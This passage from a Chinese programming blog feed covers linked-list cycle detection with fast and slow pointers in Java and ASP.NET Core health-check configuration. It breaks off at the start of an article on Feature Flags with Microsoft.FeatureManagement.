class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p>&emsp;&emsp;接下来我们来看如何用快慢指针来判断链表是否有环，这是快慢指针最常见的用法。</p>
<blockquote>
<p>&emsp;&emsp;判断链表是否有环，如果有，找到环的入口位置（下图中的 2），要求空间复杂度为 <code>O(1)</code>。</p>
</blockquote>
<figure class="image-box">
                <img src="32.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;首先我们要看如果链表有环有什么规律，如果从 head 结点开始遍历，则这个遍历指针一定会在以上的环中绕圈子，所以我们可以分别定义快慢指针，慢指针走一步，快指针走两步， 由于最后快慢指针在遍历过程中一直会在圈中里绕，且快慢指针每次的遍历步长不一样，所以它们在里面不断绕圈子的过程一定会相遇，就像 5000 米长跑，一人跑的快，一人快的慢，跑得快的人一定会追上跑得慢的（即套圈）。  </p>
<p>还不明白？那我们简单证明一下：</p>
<ol>
<li><p>假如快指针离慢指针相差一个结点，则再一次遍历，慢指针走一步，快指针走两步，相遇。</p>
<figure class="image-box">
                <img src="33.webp" alt title class>
                <p></p>
            </figure>
</li>
<li><p>假如快指针离慢指针相差两个结点，则再一次遍历，慢指针走一步，快指针走两步，相差一个结点，转成上述 1 的情况。</p>
</li>
<li><p>假如快指针离慢指针相差 N 个结点（N 大于 2），则下一次遍历由于慢指针走一步，快指针走两步，所以相差 <code>N + 1 - 2 = N - 1</code> 个结点，发现了吗，相差的结点从 N 变成了 N - 1 ，缩小了！不断地遍历，相差的结点会不断地缩小，当 N 缩小为 2 时，即转为上述步骤 2 的情况，由此得证，如果有环，快慢指针一定会相遇！</p>
</li>
</ol>
<blockquote>
<p>画外音：如果慢指针走一步，快指针走的不是两步，而是大于两步，会有什么问题，大家可以考虑一下。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否有环，返回快慢指针相遇结点，否则返回空指针</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">detectCrossNode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node slow = head;</span><br><span class="line">    Node fast = head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (fast == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slow.data == fast.data) &#123;</span><br><span class="line">            <span class="keyword">return</span> slow;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;判断有环为啥要返回相遇的结点，而不是返回 true 或 false 呢。 因为题目中还有一个要求，判断环的入口位置，就是为了这个做铺垫的，一起来看看怎么找环的入口，需要一些分析的技巧。</p>
<figure class="image-box">
                <img src="34.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;假设上图中的 7 为快慢指针相遇的结点，不难看出慢指针走了 <code>L + S</code> 步，快指针走得比慢指针更快，它除了走了 <code>L + S</code> 步外，还额外在环里绕了 n 圈，所以快指针走了 <code>L + S + nR</code> 步（R为图中环的长度），另外我们知道每遍历一次，慢指针走了一步，快指针走了两步，所以快指针走的路程是慢指针的两倍，即 <code>2 (L + S) = L + S + nR</code>，即 <code>L + S = nR</code>。</p>
<ul>
<li>当 n = 1 时，则 <code>L + S = R</code> 时，则从相遇点 7 开始遍历走到环入口点 2 的距离为 <code>R - S = L</code>，刚好是环的入口结点，而 head 与环入口点 2 的距离恰好也为 L，所以只要在头结点定义一个指针，在相遇点（7）定义另外一个指针，两个指针同时遍历，每次走一步，必然在环的入口位置 2 相遇。</li>
<li>当 n &gt; 1 时，<code>L + S = nR</code>，即 <code>L = nR - S</code>。<code>nR - S</code> 怎么理解？可以看作是指针从结点 7 出发，走了 n 圈后，回退 S 步，此时刚好指向环入口位置，也就是说如果设置一个指针指向 head（定义为 p1），另设一个指针指向 7（定义为 p2），不断遍历，p2 走了 <code>nR - S</code> 时（即环的入口位置），p1 也刚好走到这里（此时 p1 走了 <code>nR - S = L</code> 步，刚好是环入口位置），即两者相遇！</li>
</ul>
<p>&emsp;&emsp;综上所述，要找到入口结点，只需定义两个指针，一个指针指向 head，一个指针指向快慢指向的相遇点，然后这两个指针不断遍历（同时走一步），当它们指向同一个结点时即是环的入口结点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">getRingEntryNode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取快慢指针相遇结点</span></span><br><span class="line">    Node crossNode = detectCrossNode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果没有相遇点，则没有环</span></span><br><span class="line">    <span class="keyword">if</span> (crossNode == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分别定义两个指针，一个指向头结点，一个指向相交结点</span></span><br><span class="line">    Node tmp1 = head;</span><br><span class="line">    Node tmp2 = crossNode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 两者相遇点即为环的入口结点</span></span><br><span class="line">    <span class="keyword">while</span> (tmp1.data != tmp2.data) &#123;</span><br><span class="line">        tmp1 = tmp1.next;</span><br><span class="line">        tmp2 = tmp2.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;思考题：知道了环的入口结点，怎么求环的长度？</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp;本文详细讲解了链表与数组的本质区别，相信大家对两者的区别应该有了比较深刻的认识，尤其是程序局部性原理，相信大家看了应该会眼前一亮，之后通过对链表的翻转由浅入深地介绍，相信之后的链表翻转对大家应该不是什么难事了，之后再介绍了链表的另一个重要的解题技巧：快慢指针，这两大类是面试的高频题，大家一定要掌握！建议大家亲自实现一遍文中的代码哦，这样印象会更深刻一些！有一些看起来思路是这么一回事，但真正操作起来还是会有不少坑，纸上得来终觉浅，绝知此事要躬行！  </p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[.Net Core 实现健康检查]]></title>
      <url>/2020/01/04/AspNetCoreHealthChecks/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/yyfh/p/11787434.html" target="_blank" rel="noopener">https://www.cnblogs.com/yyfh/p/11787434.html</a></p>
</blockquote>
<blockquote>
<p>深入源码理解 HealthChecks：<br>一：<a href="https://www.cnblogs.com/edison0621/p/11968102.html" target="_blank" rel="noopener">https://www.cnblogs.com/edison0621/p/11968102.html</a><br>二：<a href="https://www.cnblogs.com/edison0621/p/12152475.html" target="_blank" rel="noopener">https://www.cnblogs.com/edison0621/p/12152475.html</a>  </p>
</blockquote>
<a id="more"></a>

<p>&emsp;&emsp;ASP.NET Core 提供运行状况检查中间件和库，以用于报告应用基础结构组件的运行状况。  </p>
<p>&emsp;&emsp;运行状况检查由应用程序作为 HTTP 终结点公开。可以为各种实时监视方案配置运行状况检查终结点：</p>
<ul>
<li>运行状况探测可以由容器业务流程协调程和负载均衡器用于检查应用的状态。<br>&emsp;&emsp;例如，容器业务流程协调程序可以通过停止滚动部署或重新启动容器来响应失败的运行状况检查。  负载均衡器可以通过将流量从失败的实例路由到正常实例，来应对不正常的应用。</li>
<li>可以监视内存、磁盘和其他物理服务器资源的使用情况来了解是否处于正常状态。</li>
<li>运行状况检查可以测试应用的依赖项（如数据库和外部服务终结点）以确认是否可用和正常工作。</li>
</ul>
<p>&emsp;&emsp;这个示例展示数据库的运行状态，它在验证数据库连接并返回相应的结果：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Route(<span class="meta-string">"health"</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> ActionResult <span class="title">Health</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">using</span> (<span class="keyword">var</span> connection = <span class="keyword">new</span> SqlConnection(<span class="string">"Server=.;Initial Catalog=master;Integrated Security=true"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            connection.Open();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (SqlException)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> StatusCodeResult(<span class="number">503</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> EmptyResult();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当我们请求该地址的时候时，如果连接到数据库时出现任何连接问题，它将显示一条包含 200 状态代码和 503 状态代码的空消息​​。</p>
<figure class="image-box">
                <img src="1.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="2.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;现在基于这些结果状态码,我们可以监视系统采取相关的操作。  </p>
<p>&emsp;&emsp;从 .NET Core 2.2 开始，我们不需要为运行状态在去自定义检查控制器和接口，而是框架本身已经为我们提供了运行状况的检查服务。</p>
<h1 id="安装和运行"><a href="#安装和运行" class="headerlink" title="安装和运行"></a>安装和运行</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Microsoft.Extensions.Diagnostics.HealthChecks</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;安装后，我们需要在<code>Startup.cs</code>文件的<code>ConfigureServices()</code>和<code>Configure()</code>方法中添加。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddHealthChecks();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    app.UseHealthChecks(<span class="string">"/health"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们在<code>Configure()</code>方法中配置完端点后，我们就可以通过<code>/health</code>来请求查看我们的应用程序的健康程度。</p>
<figure class="image-box">
                <img src="3.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;但是这样对于我们刚才的需求是满足不了的，那么我们如何自定义我们的健康度检查呢？<br>&emsp;&emsp;两种方式来处理：</p>
<h2 id="Option-1"><a href="#Option-1" class="headerlink" title="Option 1"></a>Option 1</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddHealthChecks()</span><br><span class="line">            .AddCheck(<span class="string">"sql"</span>, () =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">using</span> (<span class="keyword">var</span> connection = <span class="keyword">new</span> SqlConnection(<span class="string">"Server=.;Initial Catalog=master;Integrated Security=true"</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        connection.Open();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (SqlException)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">return</span> HealthCheckResult.Unhealthy();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> HealthCheckResult.Healthy();</span><br><span class="line">            &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在这里我们使用匿名方法<code>AddCheck()</code>来编写我们的自定义验证逻辑，结果是<code>HealthCheckResult</code>对象，该对象包含3个选项：</p>
<ul>
<li><code>Healthy</code>：健康</li>
<li><code>Unhealthy</code>：不良</li>
<li><code>Degraded</code>：降级</li>
</ul>
<h2 id="Option-2"><a href="#Option-2" class="headerlink" title="Option 2"></a>Option 2</h2><p>&emsp;&emsp;实现<code>IHealthCheck</code>接口并实现<code>CheckHealthAsync()</code>方法，如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DatabaseHealthCheck</span> : <span class="title">IHealthCheck</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Task&lt;HealthCheckResult&gt; <span class="title">CheckHealthAsync</span>(<span class="params">HealthCheckContext context, CancellationToken cancellationToken = <span class="keyword">default</span></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">using</span> (<span class="keyword">var</span> connection = <span class="keyword">new</span> SqlConnection(<span class="string">"Server=.;Initial Catalog=master;Integrated Security=true"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                connection.Open();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (SqlException)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> Task.FromResult(HealthCheckResult.Unhealthy());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Task.FromResult(HealthCheckResult.Healthy());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;创建该类之后，我们需要使用一些有效的唯一名称。<code>AddCheck()</code>方法在<code>ConfigureServices()</code>方法中提及该类，如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddHealthChecks()  </span><br><span class="line">            .AddCheck&lt;DatabaseHealthCheck&gt;(<span class="string">"sql"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在我们的代码就写完了，我们可以像上面那样添加任意数量的 Health Task，它将按照我们在此处声明的顺序运行。</p>
<h1 id="自定义状态码"><a href="#自定义状态码" class="headerlink" title="自定义状态码"></a>自定义状态码</h1><p>&emsp;&emsp;在之前我们也说过 200 为健康，503 为不健康。HealthCheck 服务通过以下方式使用其 options 对象提供自定义状态代码，为我们提供了更改此默认的状态码。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">config.MapHealthChecks(<span class="string">"/health"</span>, <span class="keyword">new</span> HealthCheckOptions</span><br><span class="line">&#123;</span><br><span class="line">    ResultStatusCodes = <span class="keyword">new</span> Dictionary&lt;HealthStatus, <span class="keyword">int</span>&gt; </span><br><span class="line">    &#123; </span><br><span class="line">        &#123; HealthStatus.Unhealthy, <span class="number">420</span> &#125;, </span><br><span class="line">        &#123; HealthStatus.Healthy, <span class="number">200</span> &#125;, </span><br><span class="line">        &#123; HealthStatus.Degraded, <span class="number">419</span> &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="自定义输出"><a href="#自定义输出" class="headerlink" title="自定义输出"></a>自定义输出</h1><p>&emsp;&emsp;我们可以自定义输出，以获取有关每个运行状况检查任务的更清晰详细的信息。如果我们有多个运行状况检查任务来分析哪个任务使整个服务健康状态变为“不正常”，这将非常有用。<br>&emsp;&emsp;我们可以通过<code>HealthCheckOptions</code>的<code>ResponseWriter</code>属性来实现。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    app.UseRouting()</span><br><span class="line">        .UseEndpoints(config =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">            config.MapHealthChecks(<span class="string">"/health"</span>, <span class="keyword">new</span> HealthCheckOptions</span><br><span class="line">            &#123;</span><br><span class="line">                ResponseWriter = CustomResponseWriter</span><br><span class="line">            &#125;); </span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Task <span class="title">CustomResponseWriter</span>(<span class="params">HttpContext context, HealthReport healthReport</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    context.Response.ContentType = <span class="string">"application/json"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = JsonConvert.SerializeObject(<span class="keyword">new</span></span><br><span class="line">    &#123;</span><br><span class="line">        status = healthReport.Status.ToString(),</span><br><span class="line">        errors = healthReport.Entries.Select(e =&gt; <span class="keyword">new</span></span><br><span class="line">        &#123;</span><br><span class="line">            key = e.Key,</span><br><span class="line">            <span class="keyword">value</span> = e.Value.Status.ToString()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> context.Response.WriteAsync(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="4.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;现在以 JSON 显示我们的详细信息，完成了健康状态的检查。</p>
<h1 id="健康检查界面"><a href="#健康检查界面" class="headerlink" title="健康检查界面"></a>健康检查界面</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package AspNetCore.HealthChecks.UI</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;安装完成后，需要相应地在<code>ConfigureServices()</code>和<code>Configure()</code>方法中调用相应的服务方法。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    services.AddHealthChecksUI();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IHostingEnvironment env</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    app.UseHealthChecksUI();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;配置完成后，您可以运行应用程序并指向<code>/healthchecks</code>UI 地址，该端点显示如下的 UI：</p>
<figure class="image-box">
                <img src="5.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;但是界面上没有我们刚才自定义的信息，那我们再进行配置。<br>&emsp;&emsp;<code>appsetting.json</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"ApplicationInsights"</span>: &#123;</span><br><span class="line">    <span class="attr">"InstrumentationKey"</span>: <span class="string">"your-instrumentation-key"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"Logging"</span>: &#123;</span><br><span class="line">    <span class="attr">"LogLevel"</span>: &#123;</span><br><span class="line">      <span class="attr">"Default"</span>: <span class="string">"Warning"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"AllowedHosts"</span>: <span class="string">"*"</span>,</span><br><span class="line">  <span class="attr">"HealthChecksUI"</span>: &#123;</span><br><span class="line">    <span class="attr">"HealthChecks"</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"Name"</span>: <span class="string">"Test Health"</span>,</span><br><span class="line">        <span class="attr">"Uri"</span>: <span class="string">"https://localhost:44342/health"</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"EvaluationTimeinSeconds"</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="attr">"MinimumSecondsBetweenFailureNotifications"</span>: <span class="number">60</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="6.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这样就可以看到健康状态了。</p>
<blockquote>
<p><a href="https://github.com/Xabaril/AspNetCore.Diagnostics.HealthChecks" target="_blank" rel="noopener">https://github.com/Xabaril/AspNetCore.Diagnostics.HealthChecks</a>  </p>
<p>HealthChecks packages include health checks for:</p>
<ul>
<li>Sql Server</li>
<li>MySql</li>
<li>Oracle</li>
<li>Sqlite</li>
<li>RavenDB</li>
<li>Postgres</li>
<li>EventStore</li>
<li>RabbitMQ</li>
<li>Elasticsearch</li>
<li>Redis</li>
<li>System: Disk Storage, Private Memory, Virtual Memory, Process, Windows Service</li>
<li>Azure Service Bus: EventHub, Queue and Topics</li>
<li>Azure Storage: Blob, Queue and Table</li>
<li>Azure Key Vault</li>
<li>Azure DocumentDb</li>
<li>Azure IoT Hub</li>
<li>Amazon DynamoDb</li>
<li>Amazon S3</li>
<li>Network: Ftp, SFtp, Dns, Tcp port, Smtp, Imap</li>
<li>MongoDB</li>
<li>Kafka</li>
<li>Identity Server</li>
<li>Uri: single uri and uri groups</li>
<li>Consul</li>
<li>Hangfire</li>
<li>SignalR</li>
<li>Kubernetes</li>
</ul>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> ASPNETCore </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[给你的 ASP.NET Core 程序插上 Feature Flag 的翅膀]]></title>
      <url>/2020/01/04/AspNetCoreFeatureManagement/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/hippieZhou/p/12104710.html" target="_blank" rel="noopener">https://www.cnblogs.com/hippieZhou/p/12104710.html</a></p>
</blockquote>
<a id="more"></a>

<figure class="image-box">
                <img src="749711-20191226221319349-410012928.png" alt title class>
                <p></p>
            </figure>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;我们知道，目前大多数应用程序在正式发布到生产环境之前都会经历多个不同的测试环境，通过让应用程序在多个不同的环境中运行来及时发现并解决问题，避免在线上发生不必要的损失。这是对于整个软件的发布流程来讲。但是如果想让我们的应用程序在线上环境中通过满足一些动态条件（比如电商平台在某一时间段的促销活动）从而能开启一些临时功能的话又该怎么办呢？如果你试图通过重新打包发布的方式来解决这个问题，可能有些过于大动干戈了。本文，笔者将介绍通过 <strong>Feature Flag</strong> 的方式来解决这个问题。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>&emsp;&emsp;<strong>Feature Flag</strong> 中文可译为 <strong>功能开关</strong>。通过使用这种方式，可以对我们的功能进行条件化配置，当程序在线上环境运行时，如果当前环境符合我们某一特性功能开启/关闭的条件时，应用程序会自动开启/关闭该功能。整个过程不需要人工参与，全部都是由系统本身来完成相应功能的开启和关闭。  </p>
<p>那在 <code>.NET Core</code> 中，我们该如何实现该功能呢？<br>&emsp;&emsp;微软为我们很贴心地提供了两个开发包：<code>Microsoft.FeatureManagement</code> 和 <code>Microsoft.FeatureManagement.AspNetCore</code>，该实现是<strong>基于 .NET Core 的配置系统</strong>，所以任何 .NET Core 程序都可以轻易集成该功能。</p>
<blockquote>
<p>目前还处于预览版阶段，需要在 NuGet 上勾选 <code>use prerelease</code></p>
</blockquote>
<p>&emsp;&emsp;因此，我们只需将对应包安装到我们的应用程序中即可。  </p>
<p>&emsp;&emsp;接下来，我们就一起看一下如何在 ASP.NET Core 中集成该功能。</p>
<h2 id="使用入门"><a href="#使用入门" class="headerlink" title="使用入门"></a>使用入门</h2><p>&emsp;&emsp;创建一个 ASP.NET Core Web Application 后，安装如下包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Install-Package Microsoft.FeatureManagement.AspNetCore -Version 2.0.0-preview-010610001-1263</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;接着在 <code>Startup</code> 中的 <code>ConfigureServices</code> 进行相应配置，示例如下：</p>
